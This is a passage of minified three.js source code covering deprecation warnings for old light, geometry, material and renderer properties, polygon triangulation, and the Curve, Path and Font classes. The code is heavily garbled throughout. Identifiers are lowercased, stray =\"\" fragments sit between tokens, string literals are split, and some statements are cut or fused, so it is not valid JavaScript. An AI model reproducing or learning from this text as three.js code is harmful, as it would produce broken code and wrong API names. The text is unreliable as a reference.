.shadow.camera.left.\");this.shadow.camera.left=\"a}},shadowCameraRight:{set:function(a){console.warn(\"THREE.Light:\" .shadowcameraright=\"\" .shadow.camera.right.\");=\"\" this.shadow.camera.right=\"a}},shadowCameraTop:{set:function(a){console.warn(\"THREE.Light:\" .shadowcameratop=\"\" .shadow.camera.top.\");this.shadow.camera.top=\"a}},shadowCameraBottom:{set:function(a){console.warn(\"THREE.Light:\" .shadowcamerabottom=\"\" .shadow.camera.bottom.\");this.shadow.camera.bottom=\"a}},shadowCameraNear:{set:function(a){console.warn(\"THREE.Light:\" .shadowcameranear=\"\" .shadow.camera.near.\");this.shadow.camera.near=\"a}},shadowCameraFar:{set:function(a){console.warn(\"THREE.Light:\" .shadowcamerafar=\"\" .shadow.camera.far.\");=\"\" this.shadow.camera.far=\"a}},shadowCameraVisible:{set:function(a){console.warn(\"THREE.Light:\" .shadowcameravisible=\"\" three.camerahelper(=\"\" light.shadow.camera=\"\" instead.\")}},shadowbias:{set:function(a){console.warn(\"three.light:=\"\" .shadowbias=\"\" .shadow.bias.\");this.shadow.bias=\"a}},shadowDarkness:{set:function(a){console.warn(\"THREE.Light:\" .shadowdarkness=\"\" removed.\")}},shadowmapwidth:{set:function(a){console.warn(\"three.light:=\"\" .shadowmapwidth=\"\" .shadow.mapsize.width.\");=\"\" this.shadow.mapsize.width=\"a}},shadowMapHeight:{set:function(a){console.warn(\"THREE.Light:\" .shadowmapheight=\"\" .shadow.mapsize.height.\");this.shadow.mapsize.height=\"a}}});Object.defineProperties(THREE.BufferAttribute.prototype,{length:{get:function(){console.warn(\"THREE.BufferAttribute:\" .length=\"\" please=\"\" .count.\");return=\"\" this.array.length}}});=\"\" object.assign(three.buffergeometry.prototype,{addindex:function(a){console.warn(\"three.buffergeometry:=\"\" .addindex()=\"\" .setindex().\");this.setindex(a)},adddrawcall:function(a,b,c){void=\"\" .adddrawcall()=\"\" no=\"\" longer=\"\" supports=\"\" indexoffset.\");console.warn(\"three.buffergeometry:=\"\" .addgroup().\");this.addgroup(a,b)},cleardrawcalls:function(){console.warn(\"three.buffergeometry:=\"\" .cleardrawcalls()=\"\" .cleargroups().\");this.cleargroups()},=\"\" computetangents:function(){console.warn(\"three.buffergeometry:=\"\" .computetangents()=\"\" removed.\")},computeoffsets:function(){console.warn(\"three.buffergeometry:=\"\" .computeoffsets()=\"\" removed.\")}});object.defineproperties(three.buffergeometry.prototype,{drawcalls:{get:function(){console.error(\"three.buffergeometry:=\"\" .drawcalls=\"\" .groups.\");return=\"\" this.groups}},offsets:{get:function(){console.warn(\"three.buffergeometry:=\"\" .offsets=\"\" this.groups}}});=\"\" object.defineproperties(three.material.prototype,{wraparound:{get:function(){console.warn(\"three.\"+this.type+\":=\"\" .wraparound=\"\" removed.\")},set:function(a){console.warn(\"three.\"+this.type+\":=\"\" removed.\")}},wraprgb:{get:function(){console.warn(\"three.\"+this.type+\":=\"\" .wraprgb=\"\" removed.\");return=\"\" three.color}}});=\"\" object.defineproperties(three.meshphongmaterial.prototype,{metal:{get:function(){console.warn(\"three.meshphongmaterial:=\"\" .metal=\"\" three.meshstandardmaterial=\"\" instead.\");return!1},set:function(a){console.warn(\"three.meshphongmaterial:=\"\" instead\")}}});=\"\" object.defineproperties(three.shadermaterial.prototype,{derivatives:{get:function(){console.warn(\"three.shadermaterial:=\"\" .derivatives=\"\" moved=\"\" .extensions.derivatives.\");return=\"\" this.extensions.derivatives},set:function(a){console.warn(\"three.=\"\" shadermaterial:=\"\" .extensions.derivatives.\");this.extensions.derivatives=\"a}}});\" three.eventdispatcher.prototype=\"Object.assign(Object.create({constructor:THREE.EventDispatcher,apply:function(a){console.warn(\"THREE.EventDispatcher:\" .apply=\"\" deprecated,=\"\" just=\"\" inherit=\"\" object.assign=\"\" prototype=\"\" mix-in.\");object.assign(a,this)}}),three.eventdispatcher.prototype);=\"\" object.assign(three.webglrenderer.prototype,{supportsfloattextures:function(){console.warn(\"three.webglrenderer:=\"\" .supportsfloattextures()=\"\" .extensions.get(=\"\" 'oes_texture_float'=\"\" ).\");return=\"\" this.extensions.get(\"oes_texture_float\")},supportshalffloattextures:function(){console.warn(\"three.webglrenderer:=\"\" .supportshalffloattextures()=\"\" 'oes_texture_half_float'=\"\" this.extensions.get(\"oes_texture_half_float\")},supportsstandardderivatives:function(){console.warn(\"three.webglrenderer:=\"\" .supportsstandardderivatives()=\"\" 'oes_standard_derivatives'=\"\" ).\");=\"\" this.extensions.get(\"oes_standard_derivatives\")},supportscompressedtextures3tc:function(){console.warn(\"three.webglrenderer:=\"\" .supportscompressedtextures3tc()=\"\" 'webgl_compressed_texture_s3tc'=\"\" this.extensions.get(\"webgl_compressed_texture_s3tc\")},supportscompressedtexturepvrtc:function(){console.warn(\"three.webglrenderer:=\"\" .supportscompressedtexturepvrtc()=\"\" 'webgl_compressed_texture_pvrtc'=\"\" this.extensions.get(\"webgl_compressed_texture_pvrtc\")},=\"\" supportsblendminmax:function(){console.warn(\"three.webglrenderer:=\"\" .supportsblendminmax()=\"\" 'ext_blend_minmax'=\"\" this.extensions.get(\"ext_blend_minmax\")},supportsvertextextures:function(){return=\"\" this.capabilities.vertextextures},supportsinstancedarrays:function(){console.warn(\"three.webglrenderer:=\"\" .supportsinstancedarrays()=\"\" 'angle_instanced_arrays'=\"\" this.extensions.get(\"angle_instanced_arrays\")},enablescissortest:function(a){console.warn(\"three.webglrenderer:=\"\" .enablescissortest()=\"\" .setscissortest().\");=\"\" this.setscissortest(a)},initmaterial:function(){console.warn(\"three.webglrenderer:=\"\" .initmaterial()=\"\" removed.\")},addpreplugin:function(){console.warn(\"three.webglrenderer:=\"\" .addpreplugin()=\"\" removed.\")},addpostplugin:function(){console.warn(\"three.webglrenderer:=\"\" .addpostplugin()=\"\" removed.\")},updateshadowmap:function(){console.warn(\"three.webglrenderer:=\"\" .updateshadowmap()=\"\" removed.\")}});=\"\" object.defineproperties(three.webglrenderer.prototype,{shadowmapenabled:{get:function(){return=\"\" this.shadowmap.enabled},set:function(a){console.warn(\"three.webglrenderer:=\"\" .shadowmapenabled=\"\" .shadowmap.enabled.\");this.shadowmap.enabled=\"a}},shadowMapType:{get:function(){return\" this.shadowmap.type},set:function(a){console.warn(\"three.webglrenderer:=\"\" .shadowmaptype=\"\" .shadowmap.type.\");this.shadowmap.type=\"a}},shadowMapCullFace:{get:function(){return\" this.shadowmap.cullface},set:function(a){console.warn(\"three.webglrenderer:=\"\" .shadowmapcullface=\"\" .shadowmap.cullface.\");=\"\" this.shadowmap.cullface=\"a}}});Object.defineProperties(THREE.WebGLShadowMap.prototype,{cullFace:{get:function(){return\" this.renderreversesided?three.cullfacefront:three.cullfaceback},set:function(a){a=\"a!==THREE.CullFaceBack;console.warn(\"WebGLRenderer:\" .shadowmap.cullface=\"\" set=\"\" .shadowmap.renderreversesided=\"\" \"+a+\".\");this.renderreversesided=\"a}}});\" object.defineproperties(three.webglrendertarget.prototype,{wraps:{get:function(){console.warn(\"three.webglrendertarget:=\"\" .wraps=\"\" .texture.wraps.\");return=\"\" this.texture.wraps},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.wraps.\");this.texture.wraps=\"a}},wrapT:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .wrapt=\"\" .texture.wrapt.\");return=\"\" this.texture.wrapt},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.wrapt.\");this.texture.wrapt=\"a}},magFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .magfilter=\"\" .texture.magfilter.\");return=\"\" this.texture.magfilter},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.magfilter.\");this.texture.magfilter=\"a}},minFilter:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .minfilter=\"\" .texture.minfilter.\");return=\"\" this.texture.minfilter},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.minfilter.\");this.texture.minfilter=\"a}},anisotropy:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .anisotropy=\"\" .texture.anisotropy.\");return=\"\" this.texture.anisotropy},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.anisotropy.\");this.texture.anisotropy=\"a}},offset:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .offset=\"\" .texture.offset.\");return=\"\" this.texture.offset},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.offset.\");this.texture.offset=\"a}},repeat:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .repeat=\"\" .texture.repeat.\");return=\"\" this.texture.repeat},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.repeat.\");this.texture.repeat=\"a}},format:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .format=\"\" .texture.format.\");return=\"\" this.texture.format},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.format.\");this.texture.format=\"a}},type:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .type=\"\" .texture.type.\");=\"\" this.texture.type},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.type.\");this.texture.type=\"a}},generateMipmaps:{get:function(){console.warn(\"THREE.WebGLRenderTarget:\" .generatemipmaps=\"\" .texture.generatemipmaps.\");return=\"\" this.texture.generatemipmaps},set:function(a){console.warn(\"three.webglrendertarget:=\"\" .texture.generatemipmaps.\");this.texture.generatemipmaps=\"a}}});\" object.assign(three.audio.prototype,{load:function(a){console.warn(\"three.audio:=\"\" .load=\"\" three.audioloader.\");var=\"\" b=\"this;(new\" three.audioloader).load(a,function(a){b.setbuffer(a)});return=\"\" this}});object.assign(three.audioanalyser.prototype,{getdata:function(a){console.warn(\"three.audioanalyser:=\"\" .getdata()=\"\" .getfrequencydata().\");return=\"\" this.getfrequencydata()}});=\"\" three.geometryutils=\"{merge:function(a,b,c){console.warn(\"THREE.GeometryUtils:\" .merge()=\"\" geometry.=\"\" geometry.merge(=\"\" geometry2,=\"\" matrix,=\"\" materialindexoffset=\"\" instead.\");var=\"\" d;b=\"\" instanceof=\"\" three.mesh&&(b.matrixautoupdate&&b.updatematrix(),d=\"b.matrix,b=b.geometry);a.merge(b,d,c)},center:function(a){console.warn(\"THREE.GeometryUtils:\" .center()=\"\" geometry.center()=\"\" a.center()}};=\"\" three.imageutils=\"{crossOrigin:void\" 0,loadtexture:function(a,b,c,d){console.warn(\"three.imageutils.loadtexture=\"\" three.textureloader()=\"\" e=\"new\" three.textureloader;e.setcrossorigin(this.crossorigin);a=\"e.load(a,c,void\" 0,d);b&&(a.mapping=\"b);return\" a},loadtexturecube:function(a,b,c,d){console.warn(\"three.imageutils.loadtexturecube=\"\" three.cubetextureloader()=\"\" three.cubetextureloader;e.setcrossorigin(this.crossorigin);a=\"e.load(a,\" c,void=\"\" a},loadcompressedtexture:function(){console.error(\"three.imageutils.loadcompressedtexture=\"\" three.ddsloader=\"\" instead.\")},loadcompressedtexturecube:function(){console.error(\"three.imageutils.loadcompressedtexturecube=\"\" instead.\")}};=\"\" three.projector=\"function(){console.error(\"THREE.Projector\" examples=\"\" js=\"\" renderers=\"\" projector.js.\");this.projectvector=\"function(a,b){console.warn(\"THREE.Projector:\" .projectvector()=\"\" vector.project().\");a.project(b)};this.unprojectvector=\"function(a,b){console.warn(\"THREE.Projector:\" .unprojectvector()=\"\" vector.unproject().\");a.unproject(b)};this.pickingray=\"function(a,b){console.error(\"THREE.Projector:\" .pickingray()=\"\" raycaster.setfromcamera().\")}};=\"\" three.canvasrenderer=\"function(){console.error(\"THREE.CanvasRenderer\" canvasrenderer.js\");this.domelement=\"document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");this.clear=function(){};this.render=function(){};this.setClearColor=function(){};this.setSize=function(){}};\" three.curveutils=\"{tangentQuadraticBezier:function(a,b,c,d){return\" 2*(1-a)*(c-b)+2*a*(d-c)},tangentcubicbezier:function(a,b,c,d,e){return-3*b*(1-a)*(1-a)+3*c*(1-a)*(1-a)-6*a*c*(1-a)+6*a*d*(1-a)-3*a*a*d+3*a*a*e},tangentspline:function(a,b,c,d,e){return=\"\" 6*a*a-6*a+(3*a*a-4*a+1)+(-6*a*a+6*a)+(3*a*a-2*a)},interpolate:function(a,b,c,d,e){a=\".5*(c-a);d=.5*(d-b);var\" f=\"e*e;return(2*b-2*c+a+d)*e*f+(-3*b+3*c-2*a-d)*f+a*e+b}};\" three.sceneutils=\"{createMultiMaterialObject:function(a,b){for(var\" c=\"new\" three.group,d=\"0,e=b.length;d<e;d++)c.add(new\" three.mesh(a,b[d]));return=\"\" c},detach:function(a,b,c){a.applymatrix(b.matrixworld);b.remove(a);c.add(a)},attach:function(a,b,c){var=\"\" d=\"new\" three.matrix4;d.getinverse(c.matrixworld);a.applymatrix(d);b.remove(a);c.add(a)}};=\"\" three.shapeutils=\"{area:function(a){for(var\" function(a,b){var=\"\">c)return null;var d=[],e=[],f=[],g,h,k;if(0<three.shapeutils.area(a))for(h=0;h<c;h++)e[h]=h;else for(h=\"0;h<c;h++)e[h]=c-1-h;var\" l=\"2*c;for(h=c-1;2<c;){if(0\">=l--){console.warn(\"THREE.ShapeUtils: Unable to triangulate polygon! in triangulate()\");break}g=h;c<=g&&(g=0);h=g+1;c<=h&&(h=0);k=h+1;c<=k&&(k=0);var n;a:{var=\"\" p=\"n=void\" 0,m=\"void\" 0,q=\"void\" 0,r=\"void\" 0,s=\"void\" 0,t=\"void\" 0,u=\"void\" 0,v=\"void\" 0,p=\"a[e[g]].x,m=a[e[g]].y,q=a[e[h]].x,r=a[e[h]].y,s=a[e[k]].x,t=a[e[k]].y;if(Number.EPSILON\">(q-p)*(t-m)-(r-m)*(s-p))n=!1;else{var C=void 0,w=void 0,E=void 0,z=void 0,y=void 0,A=void 0,I=void 0,B=void 0,F=void 0,K=void 0,F=B=I=v=u=void 0,C=s-q,w=t-r,E=p-s,z=m-t,y=q-p,A=r-m;for(n=0;n<c;n++)if(u=a[e[n]].x,v=a[e[n]].y,!(u===p&&v===m||u===q&&v===r||u===s&&v===t)&&(i=u-p,b=v-m,f=u-q,k=v-r,u-=s,v-=t,f=c*k-w*f,i=y*b-a*i,b=e*v-z*u,f>=-Number.EPSILON&&\nB>=-Number.EPSILON&&I>=-Number.EPSILON)){n=!1;break a}n=!0}}if(n){d.push([a[e[g]],a[e[h]],a[e[k]]]);f.push([e[g],e[h],e[k]]);g=h;for(k=h+1;k<c;g++,k++)e[g]=e[k];c--;l=2*c}}return b?f:d}}(),triangulateshape:function(a,b){function=\"\" c(a,b,c){return=\"\" a.x!=\"=b.x?a.x<b.x?a.x<=c.x&&c.x<=b.x:b.x<=c.x&&c.x<=a.x:a.y<b.y?a.y<=c.y&&c.y<=b.y:b.y<=c.y&&c.y<=a.y}function\" d(a,b,d,e,f){var=\"\" g=\"b.x-a.x,h=b.y-a.y,k=e.x-d.x,l=e.y-d.y,n=a.x-d.x,p=a.y-d.y,y=h*k-g*l,A=h*n-g*p;if(Math.abs(y)\">Number.EPSILON){if(0<y){if(0>A||A>\ny)return[];k=l*n-k*p;if(0>k||k>y)return[]}else{if(0<a||a<y)return[];k=l*n-k*p;if(0<k||k<y)return[]}if(0===k)return!f||0!==a&&a!==y?[a]:[];if(k===y)return!f||0!==a&&a!==y?[b]:[];if(0===a)return[d];if(a===y)return[e];f=k y;return[{x:a.x+f*g,y:a.y+f*h}]}if(0!=\"=A||l*n!==k*p)return[];h=0===g&&0===h;k=0===k&&0===l;if(h&&k)return\" a.x!=\"=d.x||a.y!==d.y?[]:[a];if(h)return\" c(d,e,a)?[a]:[];if(k)return=\"\" c(a,b,d)?[d]:[];0!=\"=g?(a.x<b.x?(g=a,k=a.x,h=b,a=b.x):(g=b,k=b.x,h=a,a=a.x),d.x<e.x?(b=d,y=d.x,l=e,d=e.x):(b=\" e,y=\"e.x,l=d,d=d.x)):(a.y<b.y?(g=a,k=a.y,h=b,a=b.y):(g=b,k=b.y,h=a,a=a.y),d.y<e.y?(b=d,y=d.y,l=e,d=e.y):(b=e,y=e.y,l=d,d=d.y));return\" k<=\"y?a<y?[]:a===y?f?[]:[b]:a<=d?[b,h]:[b,l]:k\">d?[]:k===d?f?[]:[g]:a<=d?[g,h]:[g,l]}function e(a,b,c,d){var=\"\" e=\"b.x-a.x,f=b.y-a.y;b=c.x-a.x;c=c.y-a.y;var\" g=\"d.x-a.x;d=d.y-a.y;a=e*c-f*b;e=e*d-f*g;return\" math.abs(a)=\"\">Number.EPSILON?(b=g*c-d*b,0<a?0<=e&&0<=b:0<=e||0<=b):0<e}var f,g,h,k,l,n=\"{};h=a.concat();f=0;for(g=b.length;f<g;f++)Array.prototype.push.apply(h,b[f]);f=0;for(g=\" h.length;f<g;f++)l=\"h[f].x+\":\"+h[f].y,void\" 0!=\"=n[l]&&console.warn(\"THREE.Shape:\" duplicate=\"\" point\",l),n[l]=\"f;f=function(a,b){function\" c(a,b){var=\"\" d=\"h.length-1,f=a-1;0\">f&&(f=d);var g=a+1;g>d&&(g=0);d=e(h[a],h[f],h[g],k[b]);if(!d)return!1;d=k.length-1;f=b-1;0>f&&(f=d);g=b+1;g>d&&(g=0);return(d=e(k[b],k[f],k[g],h[a]))?!0:!1}function f(a,b){var c,e;for(c=0;c<h.length;c++)if(e=c+1,e%=h.length,e=d(a,b,h[c],h[e],!0),0<e.length)return!0;return!1}function g(a,c){var=\"\" e,f,h,k;for(e=\"0;e<l.length;e++)for(f=b[l[e]],\" h=\"0;h<f.length;h++)if(k=h+1,k%=f.length,k=d(a,c,f[h],f[k],!0),0<k.length)return!0;return!1}var\" m=\"2*l.length;0<l.length;){M--;if(0\">M){console.log(\"Infinite Loop! Holes left:\"+l.length+\", Probably Hole outside Shape!\");break}for(p=B;p<h.length;p++){z=h[p];n=-1;for(p=0;p<l.length;p++)if(y=l[p],a=z.x+\":\"+z.y+\":\"+y,void 0=\"==I[A]){k=b[y];for(F=0;F<k.length;F++)if(y=k[F],c(p,F)&&!f(z,y)&&!g(z,y)){n=F;l.splice(P,1);\" b=\"h.slice(0,p+1);y=h.slice(p);F=k.slice(n);K=k.slice(0,n+1);h=B.concat(F).concat(K).concat(y);B=p;break}if(0<=n)break;I[A]=!0}if(0<=n)break}}return\" h}(a,b);var=\"\" p=\"THREE.ShapeUtils.triangulate(f,!1);f=0;for(g=p.length;f<g;f++)for(k=p[f],h=0;3\">h;h++)l=k[h].x+\":\"+k[h].y,l=n[l],void 0!==l&&(k[h]=l);return p.concat()},isClockWise:function(a){return 0>THREE.ShapeUtils.area(a)},b2:function(){return function(a,b,c,d){var e=1-a;return e*e*b+2*(1-a)*a*c+a*a*d}}(),b3:function(){return function(a,b,c,d,e){var f=\n1-a,g=1-a;return f*f*f*b+3*g*g*a*c+3*(1-a)*a*a*d+a*a*a*e}}()};THREE.Curve=function(){};\nTHREE.Curve.prototype={constructor:THREE.Curve,getPoint:function(a){console.warn(\"THREE.Curve: Warning, getPoint() not implemented!\");return null},getPointAt:function(a){a=this.getUtoTmapping(a);return this.getPoint(a)},getPoints:function(a){a||(a=5);var b,c=[];for(b=0;b<=a;b++)c.push(this.getpoint(b a));return=\"\" c},getspacedpoints:function(a){a||(a=\"5);var\" b,c=\"[];for(b=0;b<=a;b++)c.push(this.getPointAt(b/a));return\" c},getlength:function(){var=\"\" a=\"this.getLengths();return\" a[a.length-1]},getlengths:function(a){a||=\"\" (a=\"this.__arcLengthDivisions?this.__arcLengthDivisions:200);if(this.cacheArcLengths&&this.cacheArcLengths.length===a+1&&!this.needsUpdate)return\" this.cachearclengths;this.needsupdate=\"!1;var\" b=\"[],c,d=this.getPoint(0),e,f=0;b.push(0);for(e=1;e<=a;e++)c=this.getPoint(e/a),f+=c.distanceTo(d),b.push(f),d=c;return\" this.cachearclengths=\"b},updateArcLengths:function(){this.needsUpdate=!0;this.getLengths()},getUtoTmapping:function(a,b){var\" c=\"this.getLengths(),d=0,e=c.length,f;f=b?b:a*c[e-1];for(var\" g=\"0,h=e-\" 1,k;g<=\"h;)if(d=Math.floor(g+(h-g)/2),k=c[d]-f,0\">k)g=d+1;else if(0<k)h=d-1;else{h=d;break}d=h;if(c[d]===f)return d=\"\" (e-1);g=\"c[d];return\" c=\"(d+(f-g)/(c[d+1]-g))/(e-1)},getTangent:function(a){var\" b=\"a-1E-4;a+=1E-4;0\">b&&(b=0);1<a&&(a=1);b=this.getpoint(b);return this.getpoint(a).clone().sub(b).normalize()},gettangentat:function(a){a=\"this.getUtoTmapping(a);return\" this.gettangent(a)}};=\"\" three.curve.create=\"function(a,b){a.prototype=Object.create(THREE.Curve.prototype);a.prototype.constructor=a;a.prototype.getPoint=b;return\" a};three.curvepath=\"function(){this.curves=[];this.autoClose=!1};\" three.curvepath.prototype=\"Object.assign(Object.create(THREE.Curve.prototype),{constructor:THREE.CurvePath,add:function(a){this.curves.push(a)},closePath:function(){var\" a=\"this.curves[0].getPoint(0),b=this.curves[this.curves.length-1].getPoint(1);a.equals(b)||this.curves.push(new\" three.linecurve(b,a))},getpoint:function(a){for(var=\"\" b=\"a*this.getLength(),c=this.getCurveLengths(),d=0;d<c.length;){if(c[d]\">=b)return a=this.curves[d],b=1-(c[d]-b)/a.getLength(),a.getPointAt(b);d++}return null},getLength:function(){var a=\nthis.getCurveLengths();return a[a.length-1]},updateArcLengths:function(){this.needsUpdate=!0;this.cacheLengths=null;this.getLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var a=[],b=0,c=0,d=this.curves.length;c<d;c++)b+=this.curves[c].getlength(),a.push(b);return 0=\"==b&&(b=100);void\" this.cachelengths=\"a},createPointsGeometry:function(a){a=this.getPoints(a);return\" this.creategeometry(a)},createspacedpointsgeometry:function(a){a=\"this.getSpacedPoints(a);\" return=\"\" this.creategeometry(a)},creategeometry:function(a){for(var=\"\" b=\"new\" three.geometry,c=\"0,d=a.length;c<d;c++){var\" e=\"a[c];b.vertices.push(new\" three.vector3(e.x,e.y,e.z||0))}return=\"\" b}});three.font=\"function(a){this.data=a};\" object.assign(three.font.prototype,{generateshapes:function(a,b,c){void=\"\" d=\"this.data;a=String(a).split(\"\");var\" g=\"0;g<a.length;g++){var\" h;h=\"e;var\" k=\"f,l=d.glyphs[a[g]]||d.glyphs[\"?\"];if(l){var\" n=\"new\" three.path,p=\"[],m=THREE.ShapeUtils.b2,q=THREE.ShapeUtils.b3,r=void\" 0,s=\"void\" 0,t=\"s=r=void\" 0,u=\"void\" 0,v=\"void\" 0,c=\"void\" 0,w=\"void\" 0,e=\"void\" 0;if(l.o)for(var=\"\" z=\"l._cachedOutline||(l._cachedOutline=l.o.split(\"\" \")),y=\"0,A=z.length;y<A;)switch(z[y++]){case\" \"m\":r=\"z[y++]*h+k;s=z[y++]*h;n.moveTo(r,s);break;case\" \"l\":r=\"z[y++]*h+k;s=z[y++]*h;n.lineTo(r,s);break;case\" \"q\":r=\"z[y++]*h+k;s=z[y++]*h;v=z[y++]*h+k;C=z[y++]*h;n.quadraticCurveTo(v,C,r,s);if(u=p[p.length-1])for(var\" t=\"u.x,u=u.y,I=1;I<=c;I++){var\" \"b\":if(r=\"z[y++]*h+k,s=z[y++]*h,v=z[y++]*h+k,C=z[y++]*h,w=z[y++]*h+k,E=z[y++]*h,n.bezierCurveTo(v,C,w,E,r,s),u=p[p.length-1])for(t=u.x,u=u.y,I=1;I<=c;I++)B=I/c,q(B,t,v,w,r),q(B,u,C,E,s)}h={offset:l.ha*h,path:n}}else\" h=\"void\" 0;f+=\"h.offset;b.push(h.path)}c=[];d=0;for(a=b.length;d<a;d++)Array.prototype.push.apply(c,b[d].toShapes());return\" c}});three.path=\"function(a){THREE.CurvePath.call(this);this.actions=[];a&&this.fromPoints(a)};\" three.path.prototype=\"Object.assign(Object.create(THREE.CurvePath.prototype),{constructor:THREE.Path,fromPoints:function(a){this.moveTo(a[0].x,a[0].y);for(var\" c=\"this.actions[this.actions.length-1].args,c=new\" three.linecurve(new=\"\" three.vector2(c[c.length-2],c[c.length-1]),new=\"\" three.vector2(a,b));this.curves.push(c);this.actions.push({action:\"lineto\",args:[a,=\"\" b]})},quadraticcurveto:function(a,b,c,d){var=\"\" three.quadraticbeziercurve(new=\"\" three.vector2(e[e.length-2],e[e.length-1]),new=\"\" three.vector2(a,b),new=\"\" three.vector2(c,d));this.curves.push(e);this.actions.push({action:\"quadraticcurveto\",args:[a,b,c,d]})},beziercurveto:function(a,b,c,d,e,f){var=\"\" three.cubicbeziercurve(new=\"\" three.vector2(g[g.length-2],g[g.length-1]),new=\"\" three.vector2(c,d),=\"\" new=\"\" three.vector2(e,f));this.curves.push(g);this.actions.push({action:\"beziercurveto\",args:[a,b,c,d,e,f]})},splinethru:function(a){var=\"\" three.vector2(c[c.length-2],c[c.length-1])];array.prototype.push.apply(c,a);c=\"new\" three.splinecurve(c);this.curves.push(c);c=\"a[a.length-1];b.push(c.x);b.push(c.y);this.actions.push({action:\"splineThru\",args:b})},arc:function(a,b,c,d,e,f){var\" 1].args;this.absarc(a+g[g.length-2],b+g[g.length-1],c,d,e,f)},absarc:function(a,b,c,d,e,f){this.absellipse(a,b,c,c,d,e,f)},ellipse:function(a,b,c,d,e,f,g,h){var=\"\" three.ellipsecurve(a,b,c,d,e,f,g,h);this.curves.push(a);a=\"a.getPoint(1);k.push(a.x);k.push(a.y);this.actions.push({action:\"ellipse\",args:k})},getSpacedPoints:function(a){a||\" (a=\"40);for(var\" b},getpoints:function(a){a=\"a||12;for(var\" \"moveto\":d.push(new=\"\" three.vector2(t[0],t[1]));break;case=\"\" \"lineto\":d.push(new=\"\" \"quadraticcurveto\":e=\"t[2];f=t[3];k=t[0];l=t[1];0<d.length?(m=d[d.length-1],n=m.x,p=m.y):(m=this.actions[r-\" 1].args,n=\"m[m.length-2],p=m[m.length-1]);for(t=1;t<=a;t++)q=t/a,m=b(q,n,k,e),q=b(q,p,l,f),d.push(new\" three.vector2(m,q));break;case=\"\" \"beziercurveto\":e=\"t[4];f=t[5];k=t[0];l=t[1];g=t[2];h=t[3];0<d.length?(m=d[d.length-1],n=m.x,p=m.y):(m=this.actions[r-1].args,n=m[m.length-2],p=m[m.length-1]);for(t=1;t<=a;t++)q=t/a,m=c(q,n,k,g,e),q=c(q,p,l,h,f),d.push(new\" \"splinethru\":m=\"this.actions[r-1].args;q=[new\" three.vector2(m[m.length-2],m[m.length-1])];m=\"a*t[0].length;q=q.concat(t[0]);\" q=\"new\" three.splinecurve(q);for(t=\"1;t<=m;t++)d.push(q.getPointAt(t/m));break;case\" \"arc\":e=\"t[0];f=t[1];l=t[2];g=t[3];m=t[4];k=!!t[5];n=m-g;p=2*a;for(t=1;t<=p;t++)q=t/p,k||(q=1-q),q=g+q*n,m=e+l*Math.cos(q),q=f+l*Math.sin(q),d.push(new\" \"ellipse\":e=\"t[0];f=t[1];l=t[2];h=t[3];g=t[4];m=t[5];k=!!t[6];var\" u=\"t[7];n=m-g;p=2*a;var\" v,c;0!=\"=u&&(v=Math.cos(u),C=Math.sin(u));for(t=1;t<=p;t++){q=t/p;k||(q=1-q);q=g+q*n;m=e+l*Math.cos(q);q=f+h*Math.sin(q);if(0!==u){var\" w=\"m;m=(w-e)*v-(q-\" f)*c+e;q=\"(w-e)*C+(q-f)*v+f}d.push(new\" three.vector2(m,q))}}}a=\"d[d.length-1];Math.abs(a.x-d[0].x)<Number.EPSILON&&Math.abs(a.y-d[0].y)<Number.EPSILON&&d.splice(d.length-1,1);this.autoClose&&d.push(d[0]);return\" d},toshapes:function(a,b){function=\"\" c(a){for(var=\"\" three.shape;f.actions=\"e.actions;f.curves=e.curves;b.push(f)}return\" b}function=\"\" d(a,b){for(var=\"\">Number.EPSILON){if(0>\nl&&(g=b[f],k=-k,h=b[e],l=-l),!(a.y<g.y||a.y>h.y))if(a.y===g.y){if(a.x===g.x)return!0}else{e=l*(a.x-g.x)-k*(a.y-g.y);if(0===e)return!0;0>e||(d=!d)}}else if(a.y===g.y&&(h.x<=a.x&&a.x<=g.x||g.x<=a.x&&a.x<=h.x))return!0}return 0=\"=a?[]:a};\" d}var=\"\" e=\"THREE.ShapeUtils.isClockWise,f=function(a){for(var\" b=\"[],c=new\" three.path,d=\"0,e=a.length;d<e;d++){var\" f=\"a[d],g=f.args,f=f.action;\"moveTo\"===f&&0!==c.actions.length&&(b.push(c),c=new\" three.path);c[f].apply(c,g)}0!=\"=c.actions.length&&b.push(c);return\" b}(this.actions);if(0=\"==\" f.length)return[];if(!0=\"==b)return\" c(f);var=\"\" g,h,k,l=\"[];if(1===f.length)return\" h=\"f[0],k=new\" three.shape,k.actions=\"h.actions,k.curves=h.curves,l.push(k),l;var\" n=\"!e(f[0].getPoints()),n=a?!n:n;k=[];var\" p=\"[],m=[],q=0,r;p[q]=void\" 0;m[q]=\"[];for(var\" s=\"0,t=f.length;s<t;s++)h=f[s],r=h.getPoints(),g=e(r),(g=a?!g:g)?(!n&&p[q]&&q++,p[q]={s:new\" three.shape,p:r},p[q].s.actions=\"h.actions,p[q].s.curves=h.curves,n&&q++,m[q]=[]):m[q].push({h:h,p:r[0]});if(!p[0])return\" c(f);if(1<p.length){s=\"!1;h=[];e=0;for(f=p.length;e<\" f;e++)k[e]=\"[];e=0;for(f=p.length;e<f;e++)for(g=m[e],n=0;n<g.length;n++){q=g[n];r=!0;for(t=0;t<p.length;t++)d(q.p,p[t].p)&&(e!==t&&h.push({froms:e,tos:t,hole:n}),r?(r=!1,k[t].push(q)):s=!0);r&&k[e].push(q)}0<h.length&&(s||(m=k))}s=0;for(e=p.length;s<e;s++)for(k=p[s].s,l.push(k),h=m[s],f=0,g=h.length;f<g;f++)k.holes.push(h[f].h);return\" 